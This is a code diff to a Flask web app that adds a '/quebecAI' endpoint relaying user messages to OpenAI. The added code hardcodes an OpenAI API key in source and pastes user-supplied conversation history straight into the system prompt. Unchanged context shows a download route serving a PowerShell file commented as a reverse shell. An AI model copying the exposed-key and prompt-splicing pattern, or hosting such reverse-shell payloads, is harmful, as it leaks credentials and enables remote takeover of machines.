@@ -5,6 +5,8 @@ import flask
 import os
 from pytube import YouTube
 
+import openai
+
 app = Flask(__name__)
 
 @app.route('/')
@@ -124,6 +126,51 @@ def scavanger_hunt_end():
 
 """
 
+   These are the endpoints for the basic Quebec GPT middleman page. 
+
+"""
+
+@app.route('/quebec')
+def quebecSplash():
+    return render_template("quebecAI.html")
+
+
+@app.route('/quebecAI', methods=['POST'])
+def quebecAI():
+    data = request.json
+    user_message = data.get('message', '')
+    conversation_history = data.get('conversation', '')
+
+    model="gpt-3.5-turbo"
+    if "gpt-4" in user_message.lower() or "gpt4" in user_message.lower():
+        model="gpt-4"
+    
+
+    # Do string processing here
+    # Just put #dostringprocesshere in the code
+    openai.api_key = "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"
+
+    print(f"sending request to openai for model {model}")
+
+    completion = openai.ChatCompletion.create(
+    model=model,
+    messages=[
+        {"role": "system", "content": f"You are a helpful assistant. Your job is to help the user. You will continue an existing conversation. Here is the conversation up to now: {conversation_history}"},
+        {"role": "user", "content": f"{user_message}"}
+    ]
+    )
+
+
+    ai_message = completion.choices[0].message.content
+
+
+    processed_message = f"{ai_message}"  # Replace this line with your string processing logic
+
+    return jsonify({'response': processed_message})
+
+
+"""
+
 Misc Endpoints
 
 """
@@ -132,6 +179,7 @@ Misc Endpoints
 def file_download():
     # p.ps1 provides a reverse shell to fantasy server
     return send_file('misc/misc_files/p.ps1', as_attachment=True)
+
 
 
 if __name__ == "__main__":
